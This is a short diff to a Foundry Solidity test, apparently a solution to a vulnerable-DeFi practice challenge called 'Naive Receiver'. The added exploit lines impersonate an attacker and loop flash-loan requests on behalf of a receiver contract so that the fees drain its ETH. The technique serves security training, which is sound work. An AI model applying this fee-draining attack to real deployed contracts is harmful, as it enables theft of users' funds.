@@ -48,7 +48,17 @@ contract NaiveReceiver is Test {
         /**
          * EXPLOIT START *
          */
+        vm.startPrank(attacker); // attacker takes control
 
+        // Calculate the number of loans required to drain the receiver
+        uint256 numberOfLoans = ETHER_IN_RECEIVER / 1e18;
+
+        // request for multiple flash loans until the balance of the receiver is completely drained
+        for (uint256 i = 0; i < numberOfLoans; i++) {
+            naiveReceiverLenderPool.flashLoan(address(flashLoanReceiver), 1e18); // Request 1 ETH loan
+        }
+
+        vm.stopPrank();
         /**
          * EXPLOIT END *
          */
